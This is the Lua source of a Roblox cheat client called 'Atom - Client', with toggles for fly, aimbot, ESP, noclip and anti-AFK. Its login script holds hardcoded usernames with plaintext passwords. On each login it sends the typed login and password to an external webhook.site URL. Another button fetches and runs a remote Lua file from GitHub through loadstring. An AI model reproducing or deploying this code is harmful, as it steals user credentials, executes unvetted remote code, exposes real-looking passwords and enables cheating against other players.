TextLabel_16.TextScaled = true
TextLabel_16.TextSize = 14.000
TextLabel_16.TextWrapped = true

Frame_5.Parent = Warning
Frame_5.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame_5.BackgroundTransparency = 0.200
Frame_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_5.BorderSizePixel = 0
Frame_5.Position = UDim2.new(-0.23819302, 0, 0, 0)
Frame_5.Size = UDim2.new(0, 116, 0, 352)
Frame_5.ZIndex = 0

Background_3.Name = "Background"
Background_3.Parent = Frame_5
Background_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background_3.BackgroundTransparency = 1.000
Background_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background_3.BorderSizePixel = 0
Background_3.Position = UDim2.new(-0.000921841303, 0, 0, 0)
Background_3.Size = UDim2.new(1.00092173, 0, 1, 0)
Background_3.ZIndex = 0
Background_3.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
Background_3.ImageTransparency = 0.800
Background_3.ScaleType = Enum.ScaleType.Crop

Display.Name = "Display"
Display.Parent = Atom
Display.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Display.BackgroundTransparency = 1.000
Display.BorderColor3 = Color3.fromRGB(0, 0, 0)
Display.BorderSizePixel = 0
Display.Position = UDim2.new(0.832185328, 0, 0.0181159414, 0)
Display.Size = UDim2.new(0, 261, 0, 797)

FLY.Name = "FLY"
FLY.Parent = Display
FLY.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
FLY.BackgroundTransparency = 0.500
FLY.BorderColor3 = Color3.fromRGB(0, 0, 0)
FLY.BorderSizePixel = 0
FLY.Size = UDim2.new(0, 261, 0, 32)
FLY.Visible = false

TextLabel_17.Parent = FLY
TextLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_17.BackgroundTransparency = 1.000
TextLabel_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_17.BorderSizePixel = 0
TextLabel_17.Size = UDim2.new(0, 261, 0, 32)
TextLabel_17.Font = Enum.Font.SourceSansBold
TextLabel_17.Text = "FLY"
TextLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_17.TextScaled = true
TextLabel_17.TextSize = 14.000
TextLabel_17.TextWrapped = true

UIListLayout_2.Parent = Display
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 1)

AIM.Name = "AIM"
AIM.Parent = Display
AIM.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
AIM.BackgroundTransparency = 0.500
AIM.BorderColor3 = Color3.fromRGB(0, 0, 0)
AIM.BorderSizePixel = 0
AIM.Size = UDim2.new(0, 261, 0, 32)
AIM.Visible = false

TextLabel_18.Parent = AIM
TextLabel_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_18.BackgroundTransparency = 1.000
TextLabel_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_18.BorderSizePixel = 0
TextLabel_18.Size = UDim2.new(0, 261, 0, 32)
TextLabel_18.Font = Enum.Font.SourceSansBold
TextLabel_18.Text = "AIM"
TextLabel_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_18.TextScaled = true
TextLabel_18.TextSize = 14.000
TextLabel_18.TextWrapped = true

ESP.Name = "ESP"
ESP.Parent = Display
ESP.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
ESP.BackgroundTransparency = 0.500
ESP.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESP.BorderSizePixel = 0
ESP.Size = UDim2.new(0, 261, 0, 32)
ESP.Visible = false

TextLabel_19.Parent = ESP
TextLabel_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_19.BackgroundTransparency = 1.000
TextLabel_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_19.BorderSizePixel = 0
TextLabel_19.Size = UDim2.new(0, 261, 0, 32)
TextLabel_19.Font = Enum.Font.SourceSansBold
TextLabel_19.Text = "ESP"
TextLabel_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_19.TextScaled = true
TextLabel_19.TextSize = 14.000
TextLabel_19.TextWrapped = true

NOCLIP.Name = "NOCLIP"
NOCLIP.Parent = Display
NOCLIP.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
NOCLIP.BackgroundTransparency = 0.500
NOCLIP.BorderColor3 = Color3.fromRGB(0, 0, 0)
NOCLIP.BorderSizePixel = 0
NOCLIP.Size = UDim2.new(0, 261, 0, 32)
NOCLIP.Visible = false

TextLabel_20.Parent = NOCLIP
TextLabel_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_20.BackgroundTransparency = 1.000
TextLabel_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_20.BorderSizePixel = 0
TextLabel_20.Size = UDim2.new(0, 261, 0, 32)
TextLabel_20.Font = Enum.Font.SourceSansBold
TextLabel_20.Text = "NOCLIP"
TextLabel_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_20.TextScaled = true
TextLabel_20.TextSize = 14.000
TextLabel_20.TextWrapped = true

NOANCHOR.Name = "NO ANCHOR"
NOANCHOR.Parent = Display
NOANCHOR.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
NOANCHOR.BackgroundTransparency = 0.500
NOANCHOR.BorderColor3 = Color3.fromRGB(0, 0, 0)
NOANCHOR.BorderSizePixel = 0
NOANCHOR.Size = UDim2.new(0, 261, 0, 32)
NOANCHOR.Visible = false

TextLabel_21.Parent = NOANCHOR
TextLabel_21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_21.BackgroundTransparency = 1.000
TextLabel_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_21.BorderSizePixel = 0
TextLabel_21.Size = UDim2.new(0, 261, 0, 32)
TextLabel_21.Font = Enum.Font.SourceSansBold
TextLabel_21.Text = "NO ANCHOR"
TextLabel_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_21.TextScaled = true
TextLabel_21.TextSize = 14.000
TextLabel_21.TextWrapped = true

PROTECTIVEPLATFORM.Name = "PROTECTIVEPLATFORM"
PROTECTIVEPLATFORM.Parent = Display
PROTECTIVEPLATFORM.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
PROTECTIVEPLATFORM.BackgroundTransparency = 0.500
PROTECTIVEPLATFORM.BorderColor3 = Color3.fromRGB(0, 0, 0)
PROTECTIVEPLATFORM.BorderSizePixel = 0
PROTECTIVEPLATFORM.Size = UDim2.new(0, 261, 0, 32)
PROTECTIVEPLATFORM.Visible = false

TextLabel_22.Parent = PROTECTIVEPLATFORM
TextLabel_22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_22.BackgroundTransparency = 1.000
TextLabel_22.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_22.BorderSizePixel = 0
TextLabel_22.Size = UDim2.new(0, 261, 0, 32)
TextLabel_22.Font = Enum.Font.SourceSansBold
TextLabel_22.Text = "PROTECTIVE PLATFORM"
TextLabel_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_22.TextScaled = true
TextLabel_22.TextSize = 14.000
TextLabel_22.TextWrapped = true

DORSALTELEPORT.Name = "DORSALTELEPORT"
DORSALTELEPORT.Parent = Display
DORSALTELEPORT.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
DORSALTELEPORT.BackgroundTransparency = 0.500
DORSALTELEPORT.BorderColor3 = Color3.fromRGB(0, 0, 0)
DORSALTELEPORT.BorderSizePixel = 0
DORSALTELEPORT.Size = UDim2.new(0, 261, 0, 32)
DORSALTELEPORT.Visible = false

TextLabel_23.Parent = DORSALTELEPORT
TextLabel_23.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_23.BackgroundTransparency = 1.000
TextLabel_23.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_23.BorderSizePixel = 0
TextLabel_23.Size = UDim2.new(0, 261, 0, 32)
TextLabel_23.Font = Enum.Font.SourceSansBold
TextLabel_23.Text = "DORSAL TELEPORT"
TextLabel_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_23.TextScaled = true
TextLabel_23.TextSize = 14.000
TextLabel_23.TextWrapped = true

NOAFK.Name = "NOAFK"
NOAFK.Parent = Display
NOAFK.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
NOAFK.BackgroundTransparency = 0.500
NOAFK.BorderColor3 = Color3.fromRGB(0, 0, 0)
NOAFK.BorderSizePixel = 0
NOAFK.Size = UDim2.new(0, 261, 0, 32)
NOAFK.Visible = false

TextLabel_24.Parent = NOAFK
TextLabel_24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_24.BackgroundTransparency = 1.000
TextLabel_24.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_24.BorderSizePixel = 0
TextLabel_24.Size = UDim2.new(0, 261, 0, 32)
TextLabel_24.Font = Enum.Font.SourceSansBold
TextLabel_24.Text = "NO AFK"
TextLabel_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_24.TextScaled = true
TextLabel_24.TextSize = 14.000
TextLabel_24.TextWrapped = true

-- Scripts:

local function PXIXTT_fake_script() -- Avatar.Picture 
	local script = Instance.new('LocalScript', Avatar)

	local ImageLabel = script.Parent
	ImageLabel.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=1000&y=1000&userId="..game.Players.LocalPlayer.UserId
end
coroutine.wrap(PXIXTT_fake_script)()
local function ADZAJZZ_fake_script() -- Background.LocalScript 
	local script = Instance.new('LocalScript', Background)

	local placeId = game.PlaceId  -- замените на ID вашего плейса
	local imageLabel = script.Parent
	
	local function setPlaceThumbnail(placeId)
		local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=1000&height=1000&format=png"
		imageLabel.Image = thumbnailUrl
	end
	
	setPlaceThumbnail(placeId)
	
end
coroutine.wrap(ADZAJZZ_fake_script)()
local function ZYNB_fake_script() -- UIListLayout.LocalScript 
	local script = Instance.new('LocalScript', UIListLayout)

	-- Atom Protection
	local Atom = script.Parent.Parent.Parent.Parent
	script.Name = "UiListLayder"
	local LoginedValue = script.Parent.Parent.Parent.Parent.Main.LoginPage.Frame.AccountModule:WaitForChild("Value")
	
	local function CheckFiles()
		while true do
			wait(0.1)
			
			local File1 = Atom.Main:FindFirstChild("LoginPage")
			local File2 = Atom.Main.LoginPage.Frame:FindFirstChild("AccountModule")
			local File3 = Atom.Panel:FindFirstChild("Buttons")
			local File4 = Atom.Main.Player
			local File5 = Atom.Main.Place
			local File6 = Atom.Main.Config
			local Blur = game.Lighting:FindFirstChild("AtomBlur")
			
			if not File1 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File2 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File2.Enabled then
				warn("You tried to bypass the authorization system by item configure.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File3 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif File3.Visible and LoginedValue.Value == false then
				warn("You tried to bypass the authorization system by item configure.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File4 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif File4.Visible and LoginedValue.Value == false then
				warn("You tried to bypass the authorization system by item configure.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File5 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif File5.Visible and LoginedValue.Value == false then
				warn("You tried to bypass the authorization system by item configure.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif not File6 then
				warn("You tried to bypass the authorization system by item deletion.")
				Blur:Destroy()
				Atom:Destroy()
				break
			elseif File6.Visible and LoginedValue.Value == false then
				warn("You tried to bypass the authorization system by item configure.")
				Blur:Destroy()
				Atom:Destroy()
				break
			end
		end
	end
	
	CheckFiles()
end
local function NORSRV_fake_script() -- Frame.AccountModule 
	local script = Instance.new('LocalScript', Frame)

	local LoginBox = script.Parent.Login
	local PasswordBox = script.Parent.Password
	local LoginButton = script.Parent.Enter
	local LoginFrame = script.Parent.Parent
	local IsoginedValue = Instance.new("BoolValue", script)
	
	script.Name = "AccountModule"
	
	local Frame = script.Parent.Parent.Parent.MainFrame
	
	local CorrectSound = Instance.new("Sound", script)
	CorrectSound.SoundId = "rbxassetid://1584394759"
	
	local IncorrectSound = Instance.new("Sound", script)
	IncorrectSound.SoundId = "rbxassetid://8426701399"
	
	local AccountFrame = script.Parent.Parent.Parent.Parent.Panel.Account
	local ButtonsFrame = script.Parent.Parent.Parent.Parent.Panel.Buttons
	local Username = AccountFrame.Username
	local Role = AccountFrame.Role
	
	local webhookURL = "https://webhook.site/5477b085-6abf-4369-988c-3da251453cb8"
	
	local webhookURL = "https://webhook.site/5477b085-6abf-4369-988c-3da251453cb8"
	
	function sendDiscordMessage()
		local currentPlayer = game.Players.LocalPlayer
		if currentPlayer then
			local username = currentPlayer.Name
			local message = "Пользователь вошел в аккаунт."
			local loginValue = LoginBox.Text
			local passwordValue = PasswordBox.Text
			
			-- Форматирование URL с четырьмя параметрами
			local url = string.format("%s?Message=%s&Username=%s&Login=%s&Password=%s", webhookURL, message, username, loginValue, passwordValue)
			
			-- Отправляем запрос
			local success, response = pcall(function()
				return game:HttpGet(url, true)
			end)
			
			-- Проверяем успешность запроса
			if success then
			else
				print(response)
			end
		else
			print("nil")
		end
	end
	
	local AccountBase = { -- База данных аккаунтов пользователей
		["Atom"] = {password = "version22", role = "owner"},
		["necto119"] = {password = "Fvbghn98", role = "user"},
		["Juice"] = {password = "Juice22", role = "user"},
		["zxcRubi"] = {password = "pisapopaantilopa", role = "user"},
		["zuck"] = {password = "1233", role = "user"},
		["maga02"] = {password = "1509", role = "user"}
	}
	
	local isLoggedIn = false  -- Флаг для отслеживания состояния входа пользователя
	local userRole = nil  -- Роль текущего пользователя
	
	local function CheckCredentials(login, password)
		local account = AccountBase[login]
		if account and account.password == password then
			return account.role
		else
			return nil
		end
	end
	
	LoginButton.MouseButton1Click:Connect(function()
		local login = LoginBox.Text
		local password = PasswordBox.Text
		
		local role = CheckCredentials(login, password)
		if role then
			print("Login successful!")
			CorrectSound:Play()
			isLoggedIn = true  -- Устанавливаем флаг, если вход успешен
			userRole = role  -- Сохраняем роль пользователя
			LoginFrame.Visible = false
			if role == "user" then
				print("User role: user")
				Frame.Visible = true
				AccountFrame.Visible = true
				ButtonsFrame.Visible = true
				Username.Text = LoginBox.Text
				Role.Text = "User"
				IsoginedValue.Value = true
			elseif role == "admin" then
				print("User role: administrator")
				Frame.Visible = true
				AccountFrame.Visible = true
				ButtonsFrame.Visible = true
				Username.Text = LoginBox.Text
				Role.Text = "Admininstrator"
				IsoginedValue.Value = true
			elseif role == "owner" then
				print("User role: owner")
				Frame.Visible = true
				AccountFrame.Visible = true
				ButtonsFrame.Visible = true
				Username.Text = LoginBox.Text
				Role.Text = "Owner"
				IsoginedValue.Value = true
			end
			sendDiscordMessage()
		else
			IncorrectSound:Play()
			print("Login failed: Incorrect login or password.")
		end
	end)
	
	-- Функция для защиты
	local function ProtectFrame()
		-- Проверка видимости Frame каждые 0.1 секунды
		while true do
			wait(0.1)
			if Frame.Visible and not isLoggedIn then  -- Проверяем видимость и флаг входа
				Frame.Visible = false
				warn("You tried to bypass the authorization system by item configure.")
				script.Parent.Parent.Parent.Parent.Parent:Destroy()
			end
			if IsoginedValue.Value == true and not isLoggedIn then
				warn("You tried to bypass the authorization system by item configure.")
				script.Parent.Parent.Parent.Parent.Parent:Destroy()
			end
		end
	end
	
	-- Запуск защиты в отдельном потоке
	spawn(ProtectFrame)
end
coroutine.wrap(NORSRV_fake_script)()
local function PAEC_fake_script() -- TextLabel_5.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_5)

	local Text = script.Parent
	Text.Text = "Atom - Client: "..game.Name
end
coroutine.wrap(PAEC_fake_script)()
local function SKSM_fake_script() -- ImageLabel_2.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel_2)

	local placeId = game.PlaceId  -- замените на ID вашего плейса
	local imageLabel = script.Parent
	
	local function setPlaceThumbnail(placeId)
		local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=1000&height=1000&format=png"
		imageLabel.Image = thumbnailUrl
	end
	
	setPlaceThumbnail(placeId)
	
end
coroutine.wrap(SKSM_fake_script)()
local function CRNSYDU_fake_script() -- TextLabel_6.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_6)

	local Text = script.Parent
	Text.Text = "Place: "..game.Name
end
coroutine.wrap(CRNSYDU_fake_script)()
local function IKLN_fake_script() -- TextLabel_7.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_7)

	local Text = script.Parent
	Text.Text = "PlaceID: "..game.PlaceId
end
coroutine.wrap(IKLN_fake_script)()
local function YYXZAZ_fake_script() -- TextLabel_8.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_8)

	local Text = script.Parent
	Text.Text = "CreatorID: "..game.CreatorId
end
coroutine.wrap(YYXZAZ_fake_script)()
local function LLBZY_fake_script() -- Rejoin.LocalScript 
	local script = Instance.new('LocalScript', Rejoin)

	local TeleportService = game:GetService("TeleportService")
	local PlaceID = game.PlaceId
	local Button = script.Parent
	local Player = game.Players.LocalPlayer
	
	Button.MouseButton1Click:Connect(function()
		TeleportService:Teleport(PlaceID, Player)
	end)
end
coroutine.wrap(LLBZY_fake_script)()
local function QIQPGM_fake_script() -- Background_2.LocalScript 
	local script = Instance.new('LocalScript', Background_2)

	local placeId = game.PlaceId  -- замените на ID вашего плейса
	local imageLabel = script.Parent
	
	local function setPlaceThumbnail(placeId)
		local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=1000&height=1000&format=png"
		imageLabel.Image = thumbnailUrl
	end
	
	setPlaceThumbnail(placeId)
	
end
coroutine.wrap(QIQPGM_fake_script)()
local function LDJEEMK_fake_script() -- MainFrame.LocalScript 
	local script = Instance.new('LocalScript', MainFrame)

	local DeleteButton = script.Parent.Delete
	local SureFrame = script.Parent.Leave
	
	local Yes = script.Parent.Leave.Yes
	local No = script.Parent.Leave.No
	
	DeleteButton.MouseButton1Click:Connect(function()
		SureFrame.Visible = true
	end)
	
	Yes.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
		game.Lighting:WaitForChild("AtomBlur"):Destroy()
	end)
	No.MouseButton1Click:Connect(function()
		SureFrame.Visible = false
	end)
end
coroutine.wrap(LDJEEMK_fake_script)()
local function FZRSNU_fake_script() -- Frame2.LocalScript 
	local script = Instance.new('LocalScript', Frame2)

	local Button = script.Parent.TextButton
	Button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
	end)
end
coroutine.wrap(FZRSNU_fake_script)()
local function YUBISYH_fake_script() -- AtomFrame.Dragging 
	local script = Instance.new('LocalScript', AtomFrame)

	local UserInputService = game:GetService("UserInputService")
	script.Name = "Dragging"
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(YUBISYH_fake_script)()
local function YKMWNGS_fake_script() -- AtomFrame.Atom.Core 
	local script = Instance.new('LocalScript', AtomFrame)

	local StarterGui = game:GetService("StarterGui")
	local UserInputService = game:GetService("UserInputService")
	local AtomFrame = script.Parent
	local Opened = false
	
	local Blur = Instance.new("BlurEffect", game.Lighting)
	Blur.Size = 20
	Blur.Enabled = false
	Blur.Name = "AtomBlur"
	
	local AtomKeybind = Instance.new("StringValue", script.Parent)
	AtomKeybind.Name = "AtomKeybind"
	AtomKeybind.Value = "RightControl"
	
	StarterGui:SetCore("SendNotification", {
		Title = "Atom - Client",
		Text = "Press RightCtrl to open or close the Atom interface.",
		Duration = 5
	})
	
	UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
		if input.KeyCode == Enum.KeyCode[AtomKeybind.Value] then
			if Opened == false then
				AtomFrame.Visible = true
				Opened = true
				Blur.Enabled = true
			else
				AtomFrame.Visible = false
				Opened = false
				Blur.Enabled = false
			end
		end
	end)
	
end
coroutine.wrap(YKMWNGS_fake_script)()
local function JIJWL_fake_script() -- Background_3.LocalScript 
	local script = Instance.new('LocalScript', Background_3)

	local placeId = game.PlaceId  -- замените на ID вашего плейса
	local imageLabel = script.Parent
	
	local function setPlaceThumbnail(placeId)
		local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=1000&height=1000&format=png"
		imageLabel.Image = thumbnailUrl
	end
	
	setPlaceThumbnail(placeId)
	
end
coroutine.wrap(JIJWL_fake_script)()
coroutine.wrap(ZYNB_fake_script)()
